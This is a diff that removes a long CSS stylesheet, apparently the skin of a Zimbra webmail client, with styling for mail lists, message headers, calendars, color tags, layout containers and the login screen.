-.ZhAppSwitchLink a,.ZhAppSwitchLink a:link,.ZhAppSwitchLink a:visited{font-size:10px;font-weight:normal;}
-.Tabs{margin-right:10px;}
-.Tab{padding:2px;}
-.Tab SPAN{vertical-align:middle;padding-left:5px;padding-right:5px;}
-.Tab .icon{padding-right:0;}
-.Tab IMG{position:relative;top:-1px;left:4px;}
-.TabFiller{background-color:#FFF;border-left-width:0;text-align:center;white-space:nowrap;overflow:hidden;}
-.TabSpacer{padding:2px;width:2px;border:none;}
-.TabNormal{text-align:center;white-space:nowrap;overflow:hidden;color:white;}
-.TabSelected{text-align:center;white-space:nowrap;overflow:hidden;background-color:#FFF;border-bottom-width:0;color:#333;}
-.Tabs A:link,.Tabs A:visited{color:#333;text-decoration:none;}
-.Overview{width:170px;padding:0 6px 0 6px;}
-.Tree{background-color:#fff;border:none;border-radius:3px;height:100%;height:auto;}
-.Tree TD{color:#333;background-color:transparent;height:18px;height:1.6rem;margin:3px 0;margin:.25rem 0;border:1px solid transparent;padding:1px 0;padding:.1rem 0;cursor:pointer;padding:2px 0 2px 10px;}
-.Tree TH{background-color:transparent;}
-.Tree .Header{text-align:left;font-weight:bold;height:18px;padding:1px 5px 0 0;}
-.Tree a:link,.Tree a:visited{color:#333;text-decoration:none;}
-.ZhTISelected{background-color:#b2d7ed!important;}
-.List,TD.List{border:1px solid #b2b2b2;border-width:1px;}
-.ZhRow TD{height:20px;height:1.8rem;cursor:pointer;margin:1px;padding-right:3px;background-color:#fff;padding-right:6px;}
-.ZhRowOdd TD{height:20px;height:1.8rem;cursor:pointer;margin:1px;padding-right:3px;background-color:#fff;padding-right:6px;}
-.List TH{text-align:left;padding-left:3px;white-space:nowrap;overflow:hidden;cursor:pointer;padding-top:1px;border-bottom:1px solid #f2f2f2;background-color:#e5e5e5;}
-.List A:link,.List A:visited{color:#333;text-decoration:none;}
-.List TH A:link,.List TH A:visited{text-decoration:underline;}
-.List .Img{width:20px;padding-right:0;}
-.List .ImgNarrow{width:12px;padding-right:0;}
-.List .CB{width:20px;padding-right:0;}
-.List .Radio{width:20px;padding-right:0;text-align:center;}
-.RuleList TD{padding:8px;}
-.ZhDisplayRuleContent{background-color:#fff;border-color:#ccc #999999 #999 #cccccc;margin:0;border-width:1px;border-style:solid;}
-.ZhEditRuleContent{border:1px solid #b2b2b2;}
-.RuleList{background-color:#fff;}
-.RuleHint{color:#999;font-size:.82rem;}
-.RuleList A:link,.RuleList A:visited{color:#333;text-decoration:underline;}
-.MsgStatusImg{width:20px;padding-right:6px;}
-A:visited{color:#005A95;}
-.ConvSummary A{color:#333;text-decoration:none;}
-.TopContent{padding:0 15px 0 0;}
-.Tree .ZhTreeEdit a:link,.Tree .ZhTreeEdit a:visited{color:#333;text-decoration:underline;}
-.ZhTreeEdit{color:#CCC;font-size:1rem;padding-right:4px;font-weight:normal;text-decoration:underline;}
-.ZhAppContent2{background-color:#fff;}
-.Conv2Tb{background-color:transparent;}
-.ZhAppContent{border:1px solid #b2b2b2;border-width:1px;}
-.ZhAppColContent{border:1px solid #b2b2b2;border-width:1px;}
-.ZhAppViewContent{background-color:#fff;border-color:#ccc #999999 #999 #cccccc;margin:0;border-width:1px;border-style:solid;}
-.ZhDocPreviewContent{border-width:1px;vertical-align:baseline;padding-left:5px;}
-.SearchBar{padding:5px;}
-.TbTop INPUT,.TbBottom INPUT{padding:0;margin:0;border:none;cursor:pointer;text-align:left;font-size:1rem;color:#333;background-color:transparent;}
-.TbTop{height:26px;height:2.4rem;padding-top:2px;padding-top:.2rem;background-color:transparent;}
-.TbBottom{height:26px;height:2.4rem;padding-top:2px;padding-top:.2rem;background-color:transparent;margin-bottom:5px;}
-.Tb a:link,.Tb a:visited{text-decoration:none;font-weight:normal;color:#333;}
-.Tb2{background-color:transparent;}
-.TbBt{padding:2px;}
-.TbBt A{padding:0 5px 0 5px;}
-.TbBt#caltb a:link,.TbBt#caltb a:visited{color:#333;text-decoration:none;}
-.Tb SPAN{vertical-align:middle;}
-.Tags SPAN{vertical-align:middle;padding-right:5px;}
-.Unread{font-weight:bold;}
-.RowSelected TD{background-color:#99cae7!important;}
-.RowMatched TD{background-color:yellow;}
-.ZhConvExpanded TD{background-color:#eef;}
-.Folder{padding-bottom:2px;}
-.Folder SPAN{vertical-align:middle;padding-left:3px;}
-.Paging{padding:0 5px 0 5px;}
-.Compose{border:1px solid #b2b2b2;}
-.Compose .tobutton{width:50px;}
-.ConvSummary{background-color:#e5e5e5;border-bottom:1px solid #f2f2f2;padding:5px 0 5px 0;}
-.ConvSummary2{border-bottom:1px solid #f2f2f2;background-color:transparent;padding:5px 0 5px 5px;}
-.ConvSummary SPAN,.CompOrigAtt SPAN{vertical-align:middle;}
-.MsgHdr{background-color:#e5e5e5;border-bottom:1px solid #f2f2f2;padding:3px;border-color:#ccc #999999 #999 #cccccc;margin:0;border-width:1px;border-style:solid;}
-.MsgHdr TABLE{background-color:#e5e5e5;padding:5px 0 5px 0;}
-.MsgOps{background-color:transparent;}
-.MsgHdrName{width:10%;padding:3px 0 3px 0;vertical-align:top;text-align:right;font-weight:bold;white-space:nowrap;}
-.MsgHdrValue{padding:3px 3px 3px 3px;vertical-align:top;overflow:hidden;}
-.MsgHdrValue IMG{vertical-align:top;}
-.MsgHdrSub{font-size:1.36rem;font-weight:bold;}
-.MsgHdrSender{font-size:1.18rem;font-weight:bold;padding:3px 3px 3px 3px;vertical-align:top;overflow:hidden;}
-.MsgHdrSent{padding:3px 3px 3px 3px;vertical-align:top;overflow:hidden;white-space:nowrap;}
-.MsgHdrAttAnchor{padding:3px 3px 3px 3px;vertical-align:top;overflow:hidden;white-space:nowrap;}
-.MsgHdrAttAnchor A,.CompOrigAtt A{color:#333;text-decoration:none;}
-.MsgBody{border-color:#7f7f7f #cccccc #ccc #7f7f7f;margin:0;border-width:1px;border-style:solid;background-color:#FFF;font-family:monospace;font-size:13px;padding:10px;overflow:auto;}
-.MsgBody .zUrl{font-family:monospace;font-size:1.18rem;}
-.MsgBody-html{padding:10px;}
-.zPrintMsgs .MsgBody-html *{page:auto;}
-.zPrintMsgs .MsgBody-html,.zPrintMsgs{word-wrap:break-word;word-break:break-word;white-space:normal;}
-.zPrintMsgs table.Msg{table-layout:fixed;}
-.MsgBody-html pre,.MsgBody-html pre *,.MsgBody-html body,.MsgBody-html Section1{white-space:pre-wrap;word-wrap:break-word!important;text-wrap:suppress!important;}
-.MsgBody-plain-tab{display:inline;word-wrap:break-word!important;}
-.MsgCompose{font-family:monospace;font-size:1.18rem;width:99%;}
-.Fragment{color:gray;font-weight:normal;}
-.contactLabel{color:#333;white-space:nowrap;overflow:hidden;width:1%;text-align:right;}
-.contactImage{max-width:48px;max-height:48px;}
-.IEcontactImage{height:48px;}
-.editContactLabel{color:#333;white-space:nowrap;overflow:hidden;width:18em;text-align:right;}
-.editContactGroupLabel{width:18em;color:#333;white-space:nowrap;overflow:hidden;text-align:left;}
-.editContactGroupHintLabel{color:gray;white-space:nowrap;overflow:hidden;text-align:right;}
-.optionSectionLabel{color:#333;white-space:nowrap;overflow:hidden;font-size:15px;font-weight:bold;}
-.sectionLabel{color:#333;white-space:nowrap;overflow:hidden;border-bottom:1px solid #8597a7;font-size:15px;font-weight:bold;}
-.companyName,.companyName DIV{font-size:15px;font-weight:bold;}
-.companyFolder{font-size:13px;overflow:hidden;white-space:nowrap;width:1%;}
-.contactHeaderRow{background-color:#E9E9E9;height:36px;}
-.contactTagsRow{background-color:#E9E9E9;}
-.contactHeader,.ZhFolderHeader{font-size:1.64rem;font-weight:bold;color:#333;overflow:hidden;padding:3 0 3 2;}
-.ZhFolderHeader{white-space:nowrap;}
-.ZhSchedularTbl{margin:0 10 10 10;}
-.ZhSchedularTbl .allAttShDiv{border-bottom:1px solid gray!important;}
-.ZhSchedularTbl .attName{border:1px solid #CDCDCD;padding:0 10px;white-space:nowrap;}
-.ZhSchedularTbl .hourLblDiv{width:22px;height:22px;}
-.ZhSchedularTbl .gridDiv{width:11px;height:22px;}
-.ZhSchedularTbl .halfHour{width:11px;height:22px;border:1px solid silver;border-left:0;}
-.ZhSchedularTbl .anHour{border-right:1px solid #aaa;}
-.ZhSchedularTbl .firstDiv{border-left:1px solid silver;}
-.ZhSchedularTbl .start{border-left:3px solid green;}
-.ZhSchedularTbl .end{border-left:3px solid darkred;}
-.ZmScheduler-F{background-color:#FFF;}
-.ZmScheduler-B{background-color:#4AA6F1;}
-.ZmScheduler-T{background-color:#B9EDED;}
-.ZmScheduler-O{background-color:#8854AB;}
-.ZmScheduler-U{background-color:#FFF5CC;}
-.keyDiv{width:13px;height:13px;border:2px inset #77736a;}
-.searchField{box-sizing:border-box;-webkit-box-sizing:border-box;padding:0 3px;cursor:text;height:22px;height:2rem;height:auto;width:99%;}
-.YsearchField{box-sizing:border-box;-webkit-box-sizing:border-box;padding:0 3px;cursor:text;height:22px;height:2rem;height:auto;width:97%;}
-.SearchFieldWidth{width:100%;padding-right:5px;}
-.NoResults{text-align:center;padding:20px 0 20px 0;font-weight:bold;}
-.InitialContactSearch{text-align:center;padding:20px 0 20px 0;color:gray;}
-.ImgDisabled{opacity:.4;}
-.Displayimages{cursor:pointer;background-color:#FFC;padding:7px;font-size:10pt;border-bottom:1px solid #777;}
-.AttachmentImage{width:120px;height:80px;}
-.ShowAllImageName{font-weight:bold;font-size:16px;}
-.Status{padding:2px 0 2px 0;}
-.StatusEmpty{padding:8px 0 6px 0;}
-.Status DIV{padding:2px 25px 4px 25px;font-weight:bold;}
-.StatusInfo{background-color:#0C0;border-color:darkgreen;margin-top:4px;background-color:#FFC;opacity:.95;border-radius:3px;box-shadow:1px 1px 2px #005d92;}
-.StatusWarning{background-color:#FF9;border-color:gold;margin-top:4px;background-color:#FFC;opacity:.95;border-radius:3px;box-shadow:1px 1px 2px #005d92;}
-.StatusCritical{background-color:#F00;border-color:red;margin-top:4px;background-color:#FFC;opacity:.95;border-radius:3px;box-shadow:1px 1px 2px #005d92;}
-.VeilOverlay{width:100%;height:100%;background-color:white;position:absolute;opacity:.5;}
-.shortcutIntro{background-color:#FFC;padding:7px;border-bottom:1px solid #777;}
-.shortcutList{width:100%;border-collapse:collapse;margin-bottom:10px;}
-.shortcutListHeader{border:1px solid #999;}
-.shortcutKeys{text-align:right;padding:6px 0;vertical-align:top;border:1px solid #f2f2f2;font-weight:bold;color:#999;}
-.shortcutDescription{border:1px solid #f2f2f2;padding:5px;width:auto;}
-.shortcutKeyCombo{white-space:nowrap;padding:5px;}
-.shortcutKey{border:1px solid #f2f2f2;color:#333;font-weight:bold;padding:2px 4px 2px 4px;margin:1px 1px 1px 1px;line-height:22px;}
-.shortcutTable{table-layout:fixed;border-collapse:collapse;margin-bottom:10px;border:1px solid #999;}
-.shortcutTable TH{font-size:11px;text-align:left;font-weight:bold;padding-left:5px;color:#666;border-bottom:1px solid #999;}
-.SubHead,.PanelHead{font-size:12px;font-weight:bold;padding:3 10 5 7;}
-.PanelHead{background-color:#bab09a;}
-.ZhSubTabs{padding-top:10px;}
-.ZhEditFolderContent,.ZhEditAddressBookContent,.ZhEditCalendarContent,.ZhEditTagContent{background-color:#fff;border-color:#ccc #999999 #999 #cccccc;margin:0;border-width:1px;border-style:solid;}
-.ZhCalType,.ZhABType,.ZhFolderType{color:#999;}
-.ZhCalMonthHeaderRow{background-color:#e5e5e5;}
-.ZhCalMonthTable{border-collapse:collapse;border-spacing:0;padding:0;background-color:#fff;}
-.ZhCalMonthHeaderMonth{background-color:#e5e5e5;color:#333;font-size:1.64rem;font-weight:bold;white-space:nowrap;overflow:hidden;color:#333;text-align:center;}
-.ZhCalMonthHeaderCellsText{background-color:#e5e5e5;color:#333;font-size:1.18rem;padding:2px;border-bottom:1px solid #f2f2f2;white-space:nowrap;overflow:hidden;color:#333;text-align:center;}
-.ZhCalMonthDay,.ZhCalMonthDaySelected{border:1px solid #f2f2f2;white-space:nowrap;overflow:hidden;vertical-align:top;cursor:pointer;}
-.ZhCalMonthDaySelected{background-color:#99cae7!important;}
-.ZhCalDayHeader,.ZhCalDayHeaderToday{background-color:#e5e5e5;color:#333;font-size:1.18rem;white-space:nowrap;overflow:hidden;color:#333;text-align:center;border-bottom:1px solid #f2f2f2;line-height:2.0em;}
-.ZhCalPager{color:#333;font-size:1.18rem;white-space:nowrap;overflow:hidden;color:#333;text-align:center;}
-.ZhCalMonthHeaderRow a:link,.ZhCalMonthHeaderRow a:visited{color:#333;}
-.ZhCalDayHeaderToday,.ZhCalDayHeaderToday a:link,.ZhCalDayHeaderToday a:visited{color:#005d92;}
-.ZhCalDOM,.ZhCalDOMT,.ZhCalDOMO,.ZhCalDOMOT{white-space:nowrap;overflow:hidden;font-size:1.18rem;padding-left:3px;padding-right:3px;text-align:right;}
-.ZhCalMonthTable a:link,.ZhCalMonthTable a:visited,.ZhCalMiniContainer a:link,.ZhCalMiniContainer a:visited,.ZhCalMonthHeaderRow a:link,.ZhCalMonthHeaderRow a:visited{text-decoration:none;color:inherit;}
-.ZhCalDOM,.ZhCalDOM a:link,.ZhCalDOM a:visited{color:#333;}
-.ZhCalDOMT,.ZhCalDOMT a:link,.ZhCalDOMT:visited{color:#005d92;}
-.ZhCalDOMO,.ZhCalDOMO a:link,.ZhCalDOMO a:visited{color:#999;}
-.ZhCalDOMOT,.ZhCalDOMOT a:link,.ZhCalDOMOT a:visited{color:#999;color:#005d92;}
-.ZhCalMiniContainer{background-color:#fff;border-color:#ccc #999999 #999 #cccccc;margin:0;border-width:1px;border-style:solid;height:142px;padding-bottom:5px;}
-.ZhCalMDS{background-color:#99cae7!important;}
-.ZhCalMDOM,.ZhCalMDOMT,.ZhCalMDOMO,.ZhCalMDOMOT{white-space:nowrap;overflow:hidden;font-size:.9rem;padding-left:3px;padding-right:3px;padding:2px;border:0;text-align:center;}
-.ZhCalMDOMT{padding:1px;border:1px solid darkred;}
-.ZhCalMDHA{text-align:center;font-weight:bold;}
-.ZhCalMDOMOT,.ZhCalMDOMOT a:link,.ZhCalMDOMOT a:visited{padding:1px;border:1px solid darkred;}
-.ZhCalMDOM a:link,.ZhCalMDOM a:visited,ZhCalMDOMT a:link,.ZhCalMDOMT a:visited{color:#333;}
-.ZhCalMiniTitlebar{height:26px;height:2.4rem;padding-top:2px;padding-top:.2rem;background-color:transparent;border-right-width:0;}
-.ZhCalMiniTitleCell{white-space:nowrap;color:#333;width:auto;cursor:pointer;font-weight:normal;}
-.ZhCalMiniTitleCell a:link,.ZhCalMiniTitleCell a:visited{color:#333;}
-.ZhCalMiniDow{color:#999;text-align:center;font-weight:normal;}
-.ZhCalMonthAppt{padding:0 5px 0 5px;}
-.ZhApptSel{border:1px dashed black;}
-.ZhCalMonthAllDayAppt,.ZhCalMonthAllDayApptNew,.ZhCalDayAllDayAppt,.ZhCalDayAllDayApptNew{border:2px solid #333;border-top-width:1px;border-bottom-width:1px;}
-.ZhCalMonthAllDayAppt,.ZhCalMonthAllDayApptNew{padding:0 5px 0 5px;}
-.ZhCalDayAllDayAppt,.ZhCalDayAllDayApptNew{cursor:pointer;}
-.ZhCalDayAppt,.ZhCalDayApptNew{border:1px solid;border-color:#AAA #333333 #333 #AAAAAA;cursor:pointer;}
-.ZhCalDayApptEnd,.ZhCalTimeZone{color:#999;}
-.ZhCalDayHour{background-color:#fff;color:#333;padding:2px;border-bottom:1px solid #f2f2f2;white-space:nowrap;overflow:hidden;color:#333;text-align:center;}
-.ZhCalDayHS{border-right:1px solid #f2f2f2;}
-.ZhCalAllDayDS{border-left:1px solid #f2f2f2;}
-.ZhCalDayHSB{border-right:1px solid #f2f2f2;border-bottom:1px solid #f2f2f2;}
-.ZhCalDayHHB{border-bottom:1px solid #f4f4f4;border-bottom-style:dashed;}
-.ZhCalDayHB{border-bottom:1px solid #f4f4f4;}
-.ZhCalDayADB{border-bottom:1px solid #f4f4f4;border-bottom-width:4px;}
-.ZhCalDaySEP{border-left:1px solid #f2f2f2;}
-.ZhCalDayADHS{border-right:1px solid #f2f2f2;border-bottom:1px solid #f4f4f4;border-bottom-width:4px;}
-.ZhCalDayGrid{background-color:#fff;}
-.ZhCalDayUnionSEP{border-left:1px solid #f2f2f2;border-right:1px solid #f2f2f2;}
-.ZhCalSchedUnion{text-align:center;background-color:#D90000;color:#333;width:25px;}
-.apptHeaderRow{height:28px;}
-.editViewLabel{width:1%;color:#333;white-space:nowrap;text-align:right;}
-.apptHeader{font-size:18px;font-weight:bold;color:#333;overflow:hidden;}
-.ZhCalDayGrid A:link,.ZhCalDayGrid A:visited,.ZhCalMonthTable A:link,.ZhCalMonthTable A:visited{color:inherit;text-decoration:none;}
-.ZhBottomSep{border-bottom:1px solid #f2f2f2;}
-.ZhApptRecurrInfo{cursor:pointer;background-color:#FFC;padding:7px 0;font-size:10pt;border-bottom:1px solid #777;}
-.ZhCallListPrintTable TH{font-weight:bold;}
-.ZhCallListPrintTable TD,.ZhCallListPrintTable TH{padding-left:20;padding-right:20;border-bottom:1px solid;text-align:left;}
-.ZhZimbraTitle{font-size:1.64rem;font-weight:bold;}
-.ZhOptVoice .List TD,.ZhOptVoice .List TH{padding-left:20px;}
-.ZhOptVoiceCBCell{width:23;}
-.ZhOptVoiceRemove{padding:0;margin:0;border:none;cursor:pointer;font-size:1rem;color:#333;background-color:transparent;text-decoration:underline;}
-.Selection{background-color:#ADD6D6;}
-.SelectionDark{background-color:#91C8C8;}
-.SelectionLight{background-color:#C8E4E4;}
-.SelectionBg{background-color:#E3F1F1;}
-.Red{background-color:#E34040;}
-.RedDark{background-color:#D90000;}
-.RedLight{background-color:#EC8080;}
-.RedBg{background-color:#F5BFBF;}
-.RedC{color:#E34040;}
-.RedDarkC{color:#D90000;}
-.RedLightC{color:#EC8080;}
-.RedBgC{color:#F5BFBF;}
-.Pink{background-color:#F492BF;}
-.PinkDark{background-color:#F06EA9;}
-.PinkLight{background-color:#F8B7D4;}
-.PinkBg{background-color:#FBDBE9;}
-.PinkC{color:#F492BF;}
-.PinkDarkC{color:#F06EA9;}
-.PinkLightC{color:#F8B7D4;}
-.PinkBgC{color:#FBDBE9;}
-.Orange{background-color:#FF9940;}
-.OrangeDark{background-color:#F70;}
-.OrangeLight{background-color:#FFBB80;}
-.OrangeBg{background-color:#FFDDBF;}
-.OrangeC{color:#FF9940;}
-.OrangeDarkC{color:#F70;}
-.OrangeLightC{color:#FFBB80;}
-.OrangeBgC{color:#FFDDBF;}
-.Yellow{background-color:#FFE640;}
-.YellowDark{background-color:#FD0;}
-.YellowLight{background-color:#FFEE80;}
-.YellowBg{background-color:#FFF6BF;}
-.YellowC{color:#FFE640;}
-.YellowDarkC{color:#FD0;}
-.YellowLightC{color:#FFEE80;}
-.YellowBgC{color:#FFF6BF;}
-.Green{background-color:#40A05F;}
-.GreenDark{background-color:#00802A;}
-.GreenLight{background-color:#80C095;}
-.GreenBg{background-color:#BFDFCA;}
-.GreenC{color:#40A05F;}
-.GreenDarkC{color:#00802A;}
-.GreenLightC{color:#80C095;}
-.GreenBgC{color:#BFDFCA;}
-.Cyan{background-color:#40D9D9;}
-.CyanDark{background-color:#0CC;}
-.CyanLight{background-color:#80E6E6;}
-.CyanBg{background-color:#BFF2F2;}
-.CyanC{color:#40D9D9;}
-.CyanDarkC{color:#0CC;}
-.CyanLightC{color:#80E6E6;}
-.CyanBgC{color:#BFF2F2;}
-.Blue{background-color:#4073D9;}
-.BlueDark{background-color:#04C;}
-.BlueLight{background-color:#80A2E6;}
-.BlueBg{background-color:#BFD0F2;}
-.BlueC{color:#4073D9;}
-.BlueDarkC{color:#04C;}
-.BlueLightC{color:#80A2E6;}
-.BlueBgC{color:#BFD0F2;}
-.Purple{background-color:#7940A0;}
-.PurpleDark{background-color:#4C0080;}
-.PurpleLight{background-color:#A680C0;}
-.PurpleBg{background-color:#D2BFDF;}
-.PurpleC{color:#7940A0;}
-.PurpleDarkC{color:#4C0080;}
-.PurpleLightC{color:#A680C0;}
-.PurpleBgC{color:#D2BFDF;}
-.Gray{background-color:#BFBFBF;}
-.GrayDark{background-color:#A9A9A9;}
-.GrayLight{background-color:#D4D4D4;}
-.GrayBg{background-color:#E9E9E9;}
-.GrayC{color:#BFBFBF;}
-.GrayDarkC{color:#A9A9A9;}
-.GrayLightC{color:#D4D4D4;}
-.GrayBgC{color:#E9E9E9;}
-.ZhAC{position:relative;}
-.ZhACB{font-weight:bold;}
-.ZhACCont{position:absolute;bottom:0;}
-.ZhACCont .yui-ac-content{position:absolute;border:1px solid #404040;background:#fff;overflow:hidden;z-index:9050;}
-.ZhACCont .yui-ac-shadow{position:absolute;margin:.3em;background:#a0a0a0;z-index:9010;}
-.ZhACCont ul{margin:0;padding:1px 0;list-style:none;}
-.ZhACCont li{margin:0;padding:0 1px;cursor:default;white-space:nowrap;}
-.ZhACCont li.yui-ac-highlight{background-color:#99cae7!important;}
-.ZhACCont li.yui-ac-prehighlight{background:#FFC;}
-.ZhACTo{z-index:9050;}
-.ZhACCc{z-index:9040;}
-.ZhACBcc{z-index:9030;}
-.ZOptionsHeader{font-size:1.36rem;font-weight:bold;color:white;}
-.ZHeader{font-size:13px;font-weight:bold;}
-.ZOptionsHint{color:#999;}
-.ZOptionsSectionMain{background-color:#FFF;padding:1em;}
-.ZOptionsLabel,.ZOptionsLabelTop,.ZOptionsLabelNarrow,.ZOptionsTableLabel{width:150px;font-weight:bold;white-space:nowrap;text-align:right;vertical-align:middle;line-height:20px;}
-.ZOptionsLabelTop{vertical-align:top;line-height:20px;}
-.ZOptionsLabelNarrow{width:auto;}
-.ZOptionsInfo{color:#999;}
-.ZhDateHint{color:#999;padding-left:5px;}
-.ZhHomeVoiceCell{padding:0;}
-.ZhHomeVoiceIframe{background-color:#FFF;width:100%;height:240px;}
-.ZhHomeVoiceBody{background-color:#FFF;width:100%;height:100%;}
-.ZhHomeVoiceTable{background-color:#FFF;width:100%;}
-.ZhHomeVoiceTable .ZhHomeCell{padding-left:15px;}
-.ZhHomeRow{height:40px;}
-.ZhHomeCell{border-bottom:1px solid #ccc;padding:5px;}
-.ZhHomeTextLink{color:#000;text-decoration:none;}
-.ZhContainingBox{float:left;background-color:#fff;}
-.ZhThumbnailItem{background-color:transparent;background-repeat:no-repeat;cursor:pointer;float:left;height:120px;margin:8px;vertical-align:middle;width:100px;}
-.ZhThumbnailItem .ZhThumbnailIcon{background-color:transparent;border:2px solid #CCC;font-size:1px;height:100px;line-height:100px;text-align:center;width:96px;}
-.ZhThumbnailItem .ZhThumbnailName{display:block;font-size:1rem;font-family:Helvetica,Arial,sans-serif;margin:3px 0 0 0;text-align:center;height:14px;overflow:hidden;}
-.ZhThumbnailImg{margin:26px 24px;}
-.yui-skin-sam .yui-toolbar-container .yui-toolbar-subcont{padding:0 1.5em .5em 1em!important;border-bottom:1px solid #808080;}
-.yui-toolbar-group-indentlist,.yui-toolbar-group-alignment{width:125px!important;}
-input[type="text"],input[type="password"]{color:black;border:1px solid #bfbfbf;}
-input[disabled]{color:#999;background-color:transparent;border:1px solid #e5e5e5;}
-.ImgPrefsHeader{width:auto!important;}
-RUBY,RUBY RT{text-indent:0;}
-RUBY RT,RUBY RP{font-size:70%;font-weight:normal;}
-RUBY RT,RUBY RB{margin-right:.7em;}
-BODY{margin:0;}
-.skin_layout_row{width:100%;clear:both;}
-.skin_layout_cell{height:100%;float:left;margin-bottom:auto;}
-.skin_layout{display:block;clear:both;width:100%;height:100%;}
-#skin_outer *{box-sizing:border-box;-webkit-box-sizing:border-box;}
-.skin_table{width:100%;height:100%;border-collapse:collapse;border-width:0;}
-.skin_table>TBODY>TR>TD{padding:0;}
-.skin_table>.skin_table_row>.skin_table_cell{padding:0;}
-.skin_container{width:100%;height:100%;}
-.skin_container_ad{width:100%;height:100%;}
-.skin_td_flex{width:100%;}
-#skin_outer{display:none;}
-#skin_tr_search_results_toolbar{display:none;height:40px;width:100%;}
-#skin_tr_main{height:100%;}
-.skin_outer_ad{display:none;}
-#skin_outer{height:100%;background-color:#FFF;}
-#skin_layout_outer{width:100%;height:100%;padding:0;}
-#skin_outer_td_main{height:100%;width:100%;}
-#skin_spacing_top_row{width:100%;background:#007CC3;background:#007cc3;}
-#skin_spacing_top_row .divider{border-left:1px solid transparent;height:60%;margin:auto 10px;}
-#skin_spacing_top_row>.skin_table{border-collapse:separate;}
-#skin_spacing_top_row .DwtLinkButtonDropDownArrowRow{background-color:white;}
-#skin_container_logo{width:200px;}
-#skin_container_toast{width:100%;height:100%;}
-#skin_spacing_search,#skin_spacing_people_search{height:42px;width:null;}
-#skin_container_search{height:1.7rem;}
-#skin_container_search .ZmSearchToolbar{background-color:white;border-radius:4px;}
-#skin_container_search .ZButton{height:auto;}
-#skin_container_search .ZButtonBorder{border:0;background-color:transparent;background-image:none;box-shadow:0 0 0 transparent;border-radius:0;}
-#skin_container_search .ZWidgetTitle{display:none;}
-#skin_spacing_tree_top{text-align:center;}
-#skin_container_tree_top{height:30px;background-color:#FFF;border:1px solid #b2b2b2;border-radius:3px 3px 0 0;}
-#skin_container_username{height:auto;padding-bottom:2px;color:white;font-weight:bold;}
-#skin_container_quota{height:auto;width:100%;}
-#skin_dropMenu{font-size:14px;padding:0 10px 0 3px;text-align:center;vertical-align:middle;color:white;cursor:pointer;}
-#skin_dropMenu .DwtLinkButtonDropDownArrowTd{border-left:0;opacity:.75;padding-left:0;}
-#skin_dropMenu .ZHover .DwtLinkButtonDropDownArrowTd{opacity:1;}
-#skin_container_global_buttons{display:table-row;}
-#skin_container_global_buttons>DIV{display:table-cell;padding-top:2px;}
-#skin_container_current_app{height:26px;height:2.4rem;padding-top:2px;padding-top:.2rem;background-color:transparent;}
-#skin_td_switch_offline,#skin_container_help,#skin_container_logoff,#skin_container_adminlink{white-space:nowrap;text-align:center;padding:0 10px;}
-#skin_container_help A,#skin_container_logoff A{color:white;}
-#skin_spacing_tree{height:100%;padding-bottom:5px;}
-#skin_container_tree{background-color:#fff;border:none;border-radius:3px;height:100%;}
-#skin_tr_tree_footer{display:none;}
-#skin_container_tree_footer{background-color:#fff;border:none;border-radius:3px;height:13.75rem;}
-#skin_border_app_chooser{height:29px;height:2.6rem;border-radius:3px 3px 0 0;border:solid #b2b2b2;border-width:0 0 1px;}
-#skin_container_app_chooser{margin-right:100px;position:absolute;width:auto;height:auto;z-index:1;margin-top:-1rem;}
-#skin_container_app_chooser>DIV>TABLE{margin-top:.8rem;}
-#skin_container_global_buttons .offline{margin:0 5px 0 8px;}
-#skin_container_global_buttons .ZToolbarButton,#skin_container_global_buttons .ZToolbarButtonTable{background-color:transparent;background-image:none;border:0;border-collapse:separate;box-shadow:0 0 0 transparent;}
-#skin_container_global_buttons .ZToolbarButton{margin-left:3px;}
-#skin_container_global_buttons .ZHover .ZToolbarButtonBorder{background-color:rgba(255,255,255,.2);}
-#skin_container_global_buttons .ZFocused .ZToolbarButtonBorder{background-color:rgba(255,255,255,.2);}
-#skin_container_global_buttons .ZActive .ZToolbarButtonBorder{background-color:rgba(255,255,255,.5);}
-#skin_container_global_buttons .ZSelected .ZToolbarButtonBorder{background-color:#FFF;}
-#skin_spacing_app_top_toolbar{height:35px;height:3.0rem;}
-#skin_container_app_top_toolbar{height:26px;height:2.4rem;padding-top:2px;padding-top:.2rem;background-color:transparent;width:auto;padding-top:5px;padding-left:7px;}
-#skin_container_app_new_button{height:26px;height:2.4rem;padding-top:2px;padding-top:.2rem;background-color:transparent;width:16rem;padding:5px;}
-#skin_spacing_app_row{border-top:1px solid;border-spacing:0;padding:0 7px;height:2.5rem;margin-top:-1rem;}
-#skin_spacing_app_row{background-color:transparent;background-color:rgba(0,135,195,.1);border-color:transparent;border-color:rgba(0,135,195,.2);border-color:rgba(0,135,195,.1);}
-#skin_spacing_app_row TABLE{border-collapse:separate;}
-#skin_spacing_app_row .ZToolbarButton{height:auto;}
-#skin_spacing_app_main{height:100%;}
-#skin_container_top_ad{height:60px;}
-#skin_spacing_sidebar_ad{padding:10px 0 0 5px;}
-#skin_container_sidebar_ad{width:165px;}
-#skin_container_tree_top_ad{height:30px;}
-#skin_container_tree_bottom_ad{height:60px;}
-#skin_container_bottom_ad{height:40px;}
-#skin_td_tree{width:16rem;height:100%;}
-#skin_td_tree_app_sash{width:7px;}
-#skin_td_main{width:auto;height:100%;}
-#skin_td_sidebar_ad{width:165px;}
-#skin_container_splash_screen{background-color:#FFF;position:absolute;left:0;top:0;width:100%;height:100%;z-index:90000000;}
-.LoginScreen,.SplashScreen,.ErrorScreen{position:absolute;left:0;top:0;width:100%;height:100%;overflow:hidden;font-family:"Helvetica Neue",Helvetica,Arial,"Liberation Sans",sans-serif;font-size:1rem;background:#0088c1 url(../src/assets/images/new-back-ground-image.png) 0 0/cover no-repeat;}
-#modifiedLogin.LoginScreen{position:absolute;left:0;top:0;width:100%;min-height:100%;overflow:auto;display:flex;flex-direction:column;font-family:"Helvetica Neue",Helvetica,Arial,"Liberation Sans",sans-serif;font-size:1rem;background:#0088c1 url(../src/assets/images/new-back-ground-image.png) 0 0/cover no-repeat;}
-.LoginScreen .center,.SplashScreen .center,.ErrorScreen .center{margin-top:-160px;margin-left:-250px;}
-.LoginScreen .modernCenter{flex:1;padding:20px 0;}
-.LoginScreen .center-small,.SplashScreen .center-small,.ErrorScreen .center-small{height:270px;margin-top:-135px;margin-left:-126px;width:250px;}
-.LoginScreen .center,.LoginScreen .center-small,.SplashScreen .center,.SplashScreen .center-small,.ErrorScreen .center,.ErrorScreen .center-small{left:50%;overflow:visible;position:absolute;top:40%;z-index:11;}
-table#modernForm td{padding:2px;}
-table#modernForm td.zLoginFieldSubmit{text-align:right;padding-bottom:20px;}
